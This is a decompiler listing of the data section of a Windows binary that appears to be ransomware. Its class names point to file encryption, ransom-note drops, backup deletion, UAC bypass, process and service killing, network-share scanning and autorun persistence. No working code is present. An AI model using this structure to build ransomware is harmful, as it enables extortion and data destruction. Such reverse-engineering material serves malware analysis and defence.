void *std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::`vftable' = &unknown_libname_17; // weak
void *std::_Mpunct<wchar_t>::`vftable' = &unknown_libname_55; // weak
void *std::moneypunct<wchar_t,0>::`vftable' = &unknown_libname_55; // weak
void *std::moneypunct<wchar_t,1>::`vftable' = &unknown_libname_55; // weak
void *std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::`vftable' = &sub_436E79; // weak
void *std::num_get<unsigned short,std::istreambuf_iterator<unsigned short>>::`vftable' = &unknown_libname_17; // weak
void *std::num_put<unsigned short,std::ostreambuf_iterator<unsigned short>>::`vftable' = &unknown_libname_17; // weak
void *std::numpunct<unsigned short>::`vftable' = &sub_436DEF; // weak
void *std::collate<unsigned short>::`vftable' = &sub_436D67; // weak
void *std::messages<unsigned short>::`vftable' = &unknown_libname_17; // weak
void *std::money_get<unsigned short,std::istreambuf_iterator<unsigned short>>::`vftable' = &unknown_libname_17; // weak
void *std::money_put<unsigned short,std::ostreambuf_iterator<unsigned short>>::`vftable' = &unknown_libname_17; // weak
void *std::_Mpunct<unsigned short>::`vftable' = &unknown_libname_54; // weak
void *std::moneypunct<unsigned short,0>::`vftable' = &unknown_libname_54; // weak
void *std::moneypunct<unsigned short,1>::`vftable' = &unknown_libname_54; // weak
void *std::time_get<unsigned short,std::istreambuf_iterator<unsigned short>>::`vftable' = &sub_436E4B; // weak
void *std::time_put<unsigned short,std::ostreambuf_iterator<unsigned short>>::`vftable' = &sub_436EA7; // weak
void *std::collate<char>::`vftable' = &sub_4437B1; // weak
void *std::messages<char>::`vftable' = &unknown_libname_17; // weak
void *std::money_get<char,std::istreambuf_iterator<char>>::`vftable' = &unknown_libname_17; // weak
void *std::money_put<char,std::ostreambuf_iterator<char>>::`vftable' = &unknown_libname_17; // weak
void *std::_Mpunct<char>::`vftable' = &unknown_libname_85; // weak
void *std::moneypunct<char,0>::`vftable' = &unknown_libname_85; // weak
void *std::moneypunct<char,1>::`vftable' = &unknown_libname_85; // weak
void *std::time_get<char,std::istreambuf_iterator<char>>::`vftable' = &sub_4437D3; // weak
void *std::time_put<char,std::ostreambuf_iterator<char>>::`vftable' = &sub_443801; // weak
void *type_info::`vftable' = &sub_447769; // weak
int (__thiscall *off_49381C)(void *Block, char) = &sub_448C80; // weak
_UNKNOWN unk_493820; // weak
const IID riid = { 799777991u, 19881u, 16403u, { 150u, 151u, 32u, 204u, 63u, 212u, 15u, 133u } }; // idb
const IID rclsid = { 260519583u, 42213u, 19708u, { 189u, 62u, 115u, 230u, 21u, 69u, 114u, 221u } }; // idb
_UNKNOWN unk_493850; // weak
void *Concurrency::details::WaitBlock::`vftable' = &_purecall; // weak
void *Concurrency::details::SingleWaitBlock::`vftable' = &sub_4491E3; // weak
void *Concurrency::details::MultiWaitBlock::`vftable' = &_purecall; // weak
void *Concurrency::details::WaitAllBlock::`vftable' = &sub_449296; // weak
void *Concurrency::details::WaitAnyBlock::`vftable' = &sub_4492DD; // weak
void *Concurrency::details::TimedSingleWaitBlock::`vftable' = &sub_44923D; // weak
void *Concurrency::details::_MallocaArrayHolder<Concurrency::Context *>::`vftable' = &sub_448F79; // weak
void *Concurrency::improper_lock::`vftable' = &unknown_libname_3; // weak
void *Concurrency::scheduler_resource_allocation_error::`vftable' = &std::regex_error::`scalar deleting destructor'; // weak
void *Concurrency::invalid_operation::`vftable' = &sub_403C70; // weak
void *Concurrency::unsupported_os::`vftable' = &unknown_libname_3; // weak
void *Concurrency::details::GlobalCore::TopologyObject::`vftable' = &sub_44CDC4; // weak
void *Concurrency::details::GlobalNode::TopologyObject::`vftable' = &sub_44CDDB; // weak
void *Concurrency::details::ResourceManager::`vftable' = &sub_44E016; // weak
void *Concurrency::improper_scheduler_attach::`vftable' = &unknown_libname_3; // weak
void *Concurrency::improper_scheduler_reference::`vftable' = &unknown_libname_3; // weak
void *Concurrency::ScheduleGroup::`vftable' = &_purecall; // weak
void *Concurrency::Scheduler::`vftable' = &sub_44F725; // weak
void *Concurrency::details::RealizedChore::`vftable' = &std::_Ref_count<__ExceptionPtr>::`scalar deleting destructor'; // weak
void *Concurrency::details::SchedulerBase::`vftable' = &sub_44F748; // weak
void *Concurrency::details::CacheLocalScheduleGroupSegment::`vftable' = &sub_44F697; // weak
void *Concurrency::details::CacheLocalScheduleGroup::`vftable' = &sub_45AC61; // weak
void *Concurrency::details::FairScheduleGroupSegment::`vftable' = &sub_44F697; // weak
void *Concurrency::details::FairScheduleGroup::`vftable' = &sub_45AC61; // weak
void *Concurrency::scheduler_worker_creation_error::`vftable' = &std::regex_error::`scalar deleting destructor'; // weak
void *Concurrency::context_unblock_unbalanced::`vftable' = &unknown_libname_3; // weak
void *Concurrency::context_self_unblock::`vftable' = &unknown_libname_3; // weak
void *Concurrency::missing_wait::`vftable' = &unknown_libname_3; // weak
void *Concurrency::invalid_scheduler_policy_key::`vftable' = &unknown_libname_3; // weak
void *Concurrency::invalid_scheduler_policy_value::`vftable' = &unknown_libname_3; // weak
void *Concurrency::invalid_scheduler_policy_thread_specification::`vftable' = &unknown_libname_3; // weak
void *Concurrency::nested_scheduler_missing_detach::`vftable' = &unknown_libname_3; // weak
void *Concurrency::invalid_oversubscribe_operation::`vftable' = &unknown_libname_3; // weak
void *Concurrency::Context::`vftable' = &_purecall; // weak
void *Concurrency::details::ContextBase::`vftable' = &sub_42A5B0; // weak
void *Concurrency::details::_Interruption_exception::`vftable' = &unknown_libname_3; // weak
void *Concurrency::details::_RefCounter::`vftable' = &sub_406860; // weak
void *Concurrency::details::_CancellationTokenRegistration::`vftable' = &sub_406910; // weak
void *Concurrency::details::CancellationTokenRegistration_TaskProc::`vftable' = &sub_453DA2; // weak
void *Concurrency::details::_MallocaArrayHolder<Concurrency::event *>::`vftable' = &sub_453D80; // weak
_UNKNOWN unk_493CCC; // weak
char *off_493CF4[11] =
{
  "SchedulerKind",
  "MaxConcurrency",
  "MinConcurrency",
  "TargetOversubscriptionFactor",
  "LocalContextCacheSize",
  "ContextStackSize",
  "ContextPriority",
  "SchedulingProtocol",
  "DynamicProgressFeedback",
  "WinRTInitialization",
  "MaxPolicyElementKey"
}; // weak
void *Concurrency::details::ExecutionResource::`vftable' = &sub_454B98; // weak
void *Concurrency::details::SchedulerProxy::`vftable' = &sub_4562F4; // weak
void *Concurrency::details::FreeThreadProxy::`vftable' = &sub_45C8DB; // weak
void *Concurrency::details::IThreadProxyFactory::`vftable' = &_purecall; // weak
int dword_493EF4[4] = { 0, 64, 256, 1024 }; // weak
int off_493F04 = 5165640; // weak
void *Concurrency::details::ThreadProxyFactory<Concurrency::details::FreeThreadProxy>::`vftable' = &sub_45693E; // weak
void *Concurrency::details::FreeThreadProxyFactory::`vftable' = &sub_45693E; // weak
_UNKNOWN unk_493F5C; // weak
_DWORD dword_493F7C[4] = { -502718582, 1194401290, -720526716, 1632799356 }; // weak
_DWORD dword_493F9C[4] = { 1462214671, 1159286974, 1777817218, -872517224 }; // weak
_DWORD dword_493FBC[4] = { 791117919, 1321997942, -1333855594, 791692445 }; // weak
void *Concurrency::details::VirtualProcessor::`vftable' = &sub_456FB4; // weak
int dword_4940E8[98] =
{
  8,
  16,
  24,
  32,
  40,
  48,
  56,
  64,
  72,
  80,
  88,
  96,
  104,
  112,
  120,
  128,
  136,
  144,
  152,
  160,
  168,
  176,
  184,
  192,
  200,
  208,
  216,
  224,
  232,
  240,
  248,
  256,
  272,
  288,
  304,
  320,
  336,
  352,
  368,
  384,
  400,
  416,
  432,
  448,
  464,
  480,
  496,
  512,
  544,
  576,
  608,
  640,
  672,
  704,
  736,
  768,
  800,
  832,
  864,
  896,
  928,
  960,
  992,
  1024,
  1088,
  1152,
  1216,
  1280,
  1344,
  1408,
  1472,
  1536,
  1600,
  1664,
  1728,
  1792,
  1856,
  1920,
  1984,
  2048,
  2176,
  2304,
  2432,
  2560,
  2688,
  2816,
  2944,
  3072,
  3200,
  3328,
  3456,
  3584,
  3712,
  3840,
  3968,
  4096,
  3,
  4096
}; // weak
void *Concurrency::IExecutionContext::`vftable' = &_purecall; // weak
void *Concurrency::details::InternalContextBase::`vftable' = &sub_41C280; // weak
void *Concurrency::details::InternalContextBase::`vftable' = &sub_458BEE; // weak
void *Concurrency::details::ScheduleGroupSegmentBase::`vftable' = &sub_459F9C; // weak
void *Concurrency::details::ScheduleGroupBase::`vftable' = &sub_45AC61; // weak
void *Concurrency::details::ExternalContextBase::`vftable' = &sub_42A5B0; // weak
void *Concurrency::IScheduler::`vftable' = &_purecall; // weak
void *Concurrency::details::ThreadInternalContext::`vftable' = &sub_41C280; // weak
void *Concurrency::details::ThreadInternalContext::`vftable' = &sub_458BEE; // weak
void *Concurrency::details::ThreadScheduler::`vftable' = &sub_45B828; // weak
void *Concurrency::details::ThreadScheduler::`vftable' = &loc_45B710; // weak
void *Concurrency::details::VirtualProcessorRoot::`vftable' = &sub_454B94; // weak
void *Concurrency::details::FreeVirtualProcessorRoot::`vftable' = &sub_454B94; // weak
void *Concurrency::details::ThreadProxy::`vftable' = &sub_45C8DB; // weak
int dword_494538[] = { 1 }; // weak
int dword_494544[3] = { 1, 0, 2 }; // weak
void *Concurrency::details::ThreadVirtualProcessor::`vftable' = &sub_45DFEE; // weak
void *std::bad_typeid::`vftable' = &unknown_libname_3; // weak
void *std::__non_rtti_object::`vftable' = &unknown_libname_3; // weak
char byte_495DC4[4] = { 'I', 'N', 'F', '\0' }; // weak
char byte_495DC8[4] = { 'i', 'n', 'f', '\0' }; // weak
char byte_495DCC[] = { 'I' }; // weak
char byte_495DD4[] = { 'i' }; // weak
const unsigned __int16 _wctype[] = { 0u, 32u };
const CHAR MultiByteStr = '\x01'; // idb
int (*off_4967E8)() = &UserMathErrorFunction; // weak
_UNKNOWN unk_497278; // weak
_UNKNOWN unk_497280; // weak
_UNKNOWN unk_497284; // weak
_UNKNOWN unk_49729C; // weak
_UNKNOWN unk_4972C8; // weak
_UNKNOWN unk_4972E4; // weak
_UNKNOWN unk_4972EC; // weak
_UNKNOWN unk_497308; // weak
_UNKNOWN unk_497324; // weak
const OLECHAR psz = 0u; // idb
const char Src[2] = { '\0', '\0' }; // idb
void *std::_Packaged_state<void __cdecl (void)>::`vftable' = &sub_40BBA0; // weak
void *Concurrency::details::_DefaultPPLTaskScheduler::`vftable' = &sub_406690; // weak
int (__thiscall *___7___CancellationTokenCallback_V_lambda_1___1___RegisterCancellation__Task_impl_base_details_Concurrency__QAEXV__weak_ptr_U_Task_impl_base_details_Concurrency___std___Z__details_Concurrency__6B_)(void *Block, char) = &sub_409F90; // weak
int (__stdcall *___7___Func_impl_no_alloc_V_lambda_1___CC____CancelAndRunContinuations____Task_impl_E_details_Concurrency__UAE_N_N00ABV__shared_ptr_U_ExceptionHolder_details_Concurrency___std___Z_X__V_std__6B_[2])(int) = { &sub_40B3B0, &sub_40B3B0 }; // weak
void (__cdecl __noreturn *___7___Func_impl_no_alloc_V___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__std__X__V_std__6B_)(void *) = &sub_40BF70; // weak
int (__thiscall *___7___PPLTaskHandle_EU___InitialTaskHandle_XV_lambda_1___1_____0V___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__3__Z_U_TypeSelectorNoAsync_details_Concurrency_____task_E_Concurrency__U_TaskProcHandle_details_3__details_Concurrency__6B_)(void *Block, char) = &sub_40C200; // weak
void *std::_Associated_state<int>::`vftable' = &sub_409E70; // weak
void *std::_Task_async_state<void>::`vftable' = &sub_40B670; // weak
void *std::_Ref_count_obj2<Concurrency::details::_Task_impl<unsigned char>>::`vftable' = &sub_40AEF0; // weak
void *Concurrency::details::_TaskProcHandle::`vftable' = &sub_406D30; // weak
int (__thiscall *___7___InitialTaskHandle_XV_lambda_1___1_____0V___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__3__Z_U_TypeSelectorNoAsync_details_Concurrency_____task_E_Concurrency__6B_)(void *Block, char) = &sub_40C160; // weak
int (__stdcall *___7___Func_impl_no_alloc_V_lambda_1___1___MakeVoidToUnitFunc_details_Concurrency__YA_AV__function___A6AEXZ_std__ABV__function___A6AXXZ_6__Z_E__V_std__6B_[2])(int) = { &sub_40B4A0, &sub_405D00 }; // weak
void *Concurrency::details::_Task_impl<unsigned char>::`vftable' = &sub_409ED0; // weak
int (__stdcall *___7___Func_impl_no_alloc_V_lambda_1___1_____0V___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_V_lambda_1___5__Scan_ANShareScanner__QAE_AV__vector_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std__V__allocator_V__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___2__std__XZ___CBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__5__3__Z_X__V_std__6B_[2])(int) = { &sub_40C360, &sub_40C360 }; // weak
int (__stdcall *std::X$$V::XZ::QBE::Z::_Func_impl_no_alloc<``Concurrency::details::_Task_impl_base::_ScheduleContinuationTask'::`5'::_lambda_1_::operator()'::`8'::_lambda_1_,unsigned char * const,void,Concurrency::details::_ContinuationTaskHandleBase *>::`vftable'[2])(int) = { &sub_40B620, &sub_40B5D0 }; // weak
int (__stdcall *std::X$$V::Z::_Func_impl_no_alloc<`Concurrency::details::_Task_impl_base::_ScheduleContinuationTask'::`5'::_lambda_1_,unsigned char * const,void,Concurrency::details::_ContinuationTaskHandleBase *>::`vftable'[2])(int) = { &sub_40B540, &sub_40B540 }; // weak
void *std::_Future_error_category::`vftable' = &sub_406550; // weak
void *std::_Ref_count_obj2<Concurrency::details::_ExceptionHolder>::`vftable' = &sub_40AF00; // weak
void *Concurrency::details::_Task_impl_base::`vftable' = &sub_407CB0; // weak
void *std::_Ref_count_obj2<ANMediator>::`vftable' = &sub_40F6B0; // weak
void *ANICore::`vftable' = &sub_40F600; // weak
void *ANIColleague::`vftable' = &sub_40F7F0; // weak
_UNKNOWN unk_49E678; // weak
_UNKNOWN unk_49E6A0; // weak
_UNKNOWN unk_49E818; // weak
_UNKNOWN unk_49F020; // weak
_UNKNOWN unk_49F828; // weak
_UNKNOWN unk_4A0030; // weak
_UNKNOWN unk_4A0838; // weak
_UNKNOWN unk_4A08B8; // weak
_UNKNOWN unk_4A4740; // weak
_UNKNOWN unk_4A85C8; // weak
_UNKNOWN unk_4AC450; // weak
char byte_4B14F0[4] = { '\0', '\0', '\0', '\0' }; // weak
void *ANConfigModule::`vftable' = &sub_410F50; // weak
void *std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANConfigModule::*)(ANIEvent &&),ANConfigModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable' = &sub_4130D0; // weak
void *ANEventGetExtension::`vftable' = &sub_413240; // weak
void *ANIEvent::`vftable' = &sub_413160; // weak
void *ANFileProcessModule::`vftable' = &sub_4134B0; // weak
void *ANEventSmartScan::`vftable' = &sub_4132E0; // weak
void *std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANFileProcessModule::*)(ANIEvent &&),ANFileProcessModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable' = &sub_414720; // weak
int (__thiscall *___7___InitialTaskHandle_XV_lambda_1___1_____0V___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___3__Z_U_TypeSelectorNoAsync_details_Concurrency_____task_E_Concurrency__6B_)(void *Block, char) = &sub_418CB0; // weak
int (__stdcall *___7___Func_impl_no_alloc_V_lambda_1___4__OnScanFileSystem_ANFileSystemScannerModule__AAEX__QAUANIEvent___Z_X__QBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___std__6B_[2])(int) = { &sub_418370, &sub_418370 }; // weak
void *ANEventCryptFile::`vftable' = &sub_414FB0; // weak
void *ANEventGetEncryptExtensionsFull::`vftable' = &sub_414E30; // weak
int (__thiscall *___7___PPLTaskHandle_EU___InitialTaskHandle_XV_lambda_1___1_____0V___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___3__Z_U_TypeSelectorNoAsync_details_Concurrency_____task_E_Concurrency__U_TaskProcHandle_details_3__details_Concurrency__6B_)(void *Block, char) = &sub_418D50; // weak
void *ANEventScanFileSystem::`vftable' = &sub_4149F0; // weak
void *ANEventGetEncryptExtensionsIgnore::`vftable' = &sub_414D30; // weak
void *std::_Func_impl_no_alloc<std::_Fake_no_copy_callable_adapter<void (__thiscall ANFileSystemScannerModule::*)(ANIEvent &&),ANFileSystemScannerModule *,ANEventScanFileSystem>,void,>::`vftable' = &sub_418A90; // weak
void *ANEventGetNoteName::`vftable' = &sub_414F10; // weak
int (__stdcall *___7___Func_impl_no_alloc_V_lambda_1___1_____0V___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___3__Z_X__V_std__6B_[2])(int) = { &sub_418E50, &sub_418E50 }; // weak
void *ANEventScanFileSystemAsync::`vftable' = &sub_414B40; // weak
void *ANFileSystemScannerModule::`vftable' = &sub_416930; // weak
void *ANEventDropNote::`vftable' = &sub_414C30; // weak
void *std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANFileSystemScannerModule::*)(ANIEvent &&),ANFileSystemScannerModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable' = &sub_4183A0; // weak
void *ANNetworkModule::`vftable' = &sub_418E70; // weak
void *std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANNetworkModule::*)(ANIEvent &&),ANNetworkModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable' = &sub_419A70; // weak
void *std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANResourceScannerModule::*)(ANIEvent &&),ANResourceScannerModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable' = &sub_41A2F0; // weak
void *ANResourceScannerModule::`vftable' = &sub_419AA0; // weak
void *std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANSystemModule::*)(ANIEvent &&),ANSystemModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable' = &sub_41AE90; // weak
void *ANSystemModule::`vftable' = &sub_41A320; // weak
void *cimg_library::CImgArgumentException::`vftable' = &sub_41C290; // weak
void *ANEventBypassUAC::`vftable' = &sub_413160; // weak
void *ANEventEnableLinkedConnections::`vftable' = &sub_413160; // weak
void *ANEventKillProcesses::`vftable' = &sub_41BA70; // weak
void *ANEventShareScan::`vftable' = &sub_41B310; // weak
void *ANEventGetProcesses::`vftable' = &sub_41B680; // weak
void *ANEventGetPublicKey::`vftable' = &sub_41B500; // weak
char **off_4B17B4[4] = { &off_4B1500, &off_4B030C, &off_4B14F8, &off_4B0304 }; // weak
void *ANEventStopServices::`vftable' = &sub_41B8F0; // weak
void *ANEventGetEncKey::`vftable' = &sub_41BC30; // weak
void *ANEventInitFileProcess::`vftable' = &sub_41BB00; // weak
char byte_4B17E0[256] =
{
  '\0',
  '\x04',
  '\a',
  '\t',
  '\v',
  '\r',
  '\x0F',
  '\x11',
  '\x13',
  '\x15',
  '\x16',
  '\x18',
  '\x1A',
  '\x1B',
  '\x1D',
  '\x1E',
  ' ',
  '!',
  '#',
  '$',
  '&',
  '\'',
  ')',
  '*',
  '+',
  '-',
  '.',
  '/',
  '1',
  '2',
  '3',
  '4',
  '6',
  '7',
  '8',
  ':',
  ';',
  '<',
  '=',
  '>',
  '@',
  'A',
  'B',
  'C',
  'D',
  'E',
  'G',
  'H',
  'I',
  'J',
  'K',
  'L',
  'M',
  'N',
  'P',
  'Q',
  'R',
  'S',
  'T',
  'U',
  'V',
  'W',
  'X',
  'Y',
  'Z',
  '[',
  ']',
  '^',
  '_',
  '`',
  'a',
  'b',
  'c',
  'd',
  'e',
  'f',
  'g',
  'h',
  'i',
  'j',
  'k',
  'l',
  'm',
  'n',
  'o',
  'p',
  'q',
  'r',
  's',
  't',
  'u',
  'v',
  'w',
  'x',
  'y',
  'z',
  '{',
  '|',
  '|',
  '}',
  '~',
  '\x7F',
  '',
  '\x81',
  '\x82',
  '\x83',
  '\x84',
  '\x85',
  '\x86',
  '\x87',
  '\x88',
  '\x89',
  '\x8A',
  '\x8A',
  '\x8B',
  '\x8C',
  '\x8D',
  '\x8E',
  '\x8F',
  '\x90',
  '\x91',
  '\x92',
  '\x93',
  '\x94',
  '\x94',
  '\x95',
  '\x96',
  '\x97',
  '\x98',
  '\x99',
  '\x9A',
  '\x9B',
  '\x9C',
  '\x9D',
  '\x9D',
  '\x9E',
  '\x9F',
  '\xA0',
  '\xA1',
  '\xA2',
  '\xA3',
  '\xA4',
  '\xA4',
  '\xA5',
  '\xA6',
  '\xA7',
  '\xA8',
  '\xA9',
  '\xAA',
  '\xAA',
  '\xAB',
  '\xAC',
  '\xAD',
  '\xAE',
  '\xAF',
  '\xB0',
  '\xB0',
  '\xB1',
  '\xB2',
  '\xB3',
  '\xB4',
  '\xB5',
  '\xB5',
  '\xB6',
  '\xB7',
  '\xB8',
  '\xB9',
  '\xBA',
  '\xBA',
  '\xBB',
  '\xBC',
  '\xBD',
  '\xBE',
  '\xBF',
  '\xBF',
  '\xC0',
  '\xC1',
  '\xC2',
  '\xC3',
  '\xC4',
  '\xC4',
  '\xC5',
  '\xC6',
  '\xC7',
  '\xC8',
  '\xC8',
  '\xC9',
  '\xCA',
  '\xCB',
  '\xCC',
  '\xCD',
  '\xCD',
  '\xCE',
  '\xCF',
  '\xD0',
  '\xD1',
  '\xD1',
  '\xD2',
  '\xD3',
  '\xD4',
  '\xD5',
  '\xD5',
  '\xD6',
  '\xD7',
  '\xD8',
  '\xD8',
  '\xD9',
  '\xDA',
  '\xDB',
  '\xDC',
  '\xDC',
  '\xDD',
  '\xDE',
  '\xDF',
  '\xE0',
  '\xE0',
  '\xE1',
  '\xE2',
  '\xE3',
  '\xE3',
  '\xE4',
  '\xE5',
  '\xE6',
  '\xE7',
  '\xE7',
  '\xE8',
  '\xE9',
  '\xEA',
  '\xEA',
  '\xEB',
  '\xEC',
  '\xED',
  '\xEE',
  '\xEE',
  '\xEF',
  '\xF0',
  '\xF1',
  '\xF1',
  '\xF2',
  '\xF3',
  '\xF4',
  '\xF4',
  '\xF5',
  '\xF6',
  '\xF7',
  '\xF7',
  '\xF8',
  '\xF9',
  '\xFA',
  '\xFA',
  '\xFB',
  '\xFC',
  '\xFD',
  '\xFD',
  '\xFE',
  '\xFF'
}; // weak
int dword_4B18E0[4] = { 13, 32, 64, 128 }; // weak
void *ANEventGetID::`vftable' = &sub_41B3A0; // weak
void *ANEventPutToNote::`vftable' = &sub_41B470; // weak
void *ANEventDisableUAC::`vftable' = &sub_413160; // weak
char byte_4B1908[4] = { '\x01', '\0', '\0', '\x01' }; // weak
void *ANEventGetInterval::`vftable' = &sub_41B6B0; // weak
void *cimg_library::CImgInstanceException::`vftable' = &sub_41C290; // weak
void *ANEventDriveScan::`vftable' = &sub_41B250; // weak
void *ANEventRemoveBackups::`vftable' = &sub_41B6B0; // weak
void *ANEventScanWhiteListAsync::`vftable' = &sub_413160; // weak
void *ANEventGetServices::`vftable' = &sub_41B5C0; // weak
int dword_4B1940[4] = { 86, 91, 91, 47 }; // weak
void *cimg_library::CImgIOException::`vftable' = &sub_41C290; // weak
void *ANEventAddToAutorun::`vftable' = &sub_41B830; // weak
int dword_4B19AC[4] = { 10, 26, 52, 104 }; // weak
void *ANCore::`vftable' = &sub_41F4B0; // weak
void *ANEventRemoveServices::`vftable' = &sub_41B9B0; // weak
void *ANEventIsRunning::`vftable' = &sub_41B190; // weak
void *ANEventCopySelf::`vftable' = &sub_41B750; // weak
void *ANEventGetBuildType::`vftable' = &sub_41B6B0; // weak
int dword_4B19F4[4] = { 1, 1, 2, 2 }; // weak
void *ANEventHiddenDevicesScan::`vftable' = &sub_413160; // weak
void *cimg_library::CImgException::`vftable' = &sub_41C290; // weak
void *ANEventGetExternalIP::`vftable' = &sub_41BBA0; // weak
void *ANEventGetLid::`vftable' = &sub_41B6B0; // weak
char byte_4B1A28[] = { '0' }; // weak
__int128 xmmword_4E97A4 = 0x6D5C6E69625C6E6F4364654D585C3A43i64; // weak
__int64 qword_4EA220[] = { 0i64 }; // weak
__int128 xmmword_4EA230 = 0x7FFFFFFF7FFFFFFF7FFFFFFF7FFFFFFFi64; // weak
const _ThrowInfo _TI2_AVbad_alloc_std__ = { 0u, &unknown_libname_1, NULL, &_CTA2_AVbad_alloc_std__ }; // idb
const _ThrowInfo _TI3_AVinvalid_argument_std__ = { 0u, &unknown_libname_1, NULL, &_CTA3_AVinvalid_argument_std__ }; // idb
const _ThrowInfo _TI3_AVlength_error_std__ = { 0u, &unknown_libname_1, NULL, &_CTA3_AVlength_error_std__ }; // idb
const _ThrowInfo _TI3_AVout_of_range_std__ = { 0u, &unknown_libname_1, NULL, &_CTA3_AVout_of_range_std__ }; // idb
const _ThrowInfo _TI2_AVbad_exception_std__ = { 0u, &unknown_libname_6, NULL, &_CTA2_AVbad_exception_std__ }; // idb
const _ThrowInfo _TI2_AVbad_cast_std__ = { 0u, &unknown_libname_1, NULL, &_CTA2_AVbad_cast_std__ }; // idb
const _ThrowInfo _TI1_AV_com_error__ = { 0u, &sub_448C40, NULL, &_CTA1_AV_com_error__ }; // idb
const _ThrowInfo _TI2_AVimproper_lock_Concurrency__ = { 0u, &unknown_libname_1, NULL, &_CTA2_AVimproper_lock_Concurrency__ }; // idb
const _ThrowInfo _TI2_AVscheduler_resource_allocation_error_Concurrency__ =
{
  0u,
  &unknown_libname_1,
  NULL,
  &_CTA2_AVscheduler_resource_allocation_error_Concurrency__
}; // idb
const _ThrowInfo _TI2_AVunsupported_os_Concurrency__ = { 0u, &unknown_libname_1, NULL, &_CTA2_AVunsupported_os_Concurrency__ }; // idb
const _ThrowInfo _TI2_AVimproper_scheduler_reference_Concurrency__ =
{
  0u,
  &unknown_libname_1,
  NULL,
  &_CTA2_AVimproper_scheduler_reference_Concurrency__
}; // idb
const _ThrowInfo _TI2_AVimproper_scheduler_attach_Concurrency__ =
{
  0u,
  &unknown_libname_1,
  NULL,
  &_CTA2_AVimproper_scheduler_attach_Concurrency__
}; // idb
const _ThrowInfo _TI2_AVmissing_wait_Concurrency__ = { 0u, &unknown_libname_1, NULL, &_CTA2_AVmissing_wait_Concurrency__ }; // idb
const _ThrowInfo _TI2_AV_Interruption_exception_details_Concurrency__ =
{
  0u,
  &unknown_libname_1,
  NULL,
  &_CTA2_AV_Interruption_exception_details_Concurrency__
}; // idb
const _ThrowInfo _TI2_AVinvalid_scheduler_policy_key_Concurrency__ =
{
  0u,
  &unknown_libname_1,
  NULL,
  &_CTA2_AVinvalid_scheduler_policy_key_Concurrency__
}; // idb
const _ThrowInfo _TI2_AVinvalid_scheduler_policy_value_Concurrency__ =
{
  0u,
  &unknown_libname_1,
  NULL,
  &_CTA2_AVinvalid_scheduler_policy_value_Concurrency__
}; // idb
__TI_flags _TI2_AVinvalid_scheduler_policy_thread_specification_Concurrency__ = 0; // weak
const _ThrowInfo _TI2_AVcontext_unblock_unbalanced_Concurrency__ =
{
  0u,
  &unknown_libname_1,
  NULL,
  &_CTA2_AVcontext_unblock_unbalanced_Concurrency__
}; // idb
__TI_flags _TI2_AVcontext_self_unblock_Concurrency__ = 0; // weak
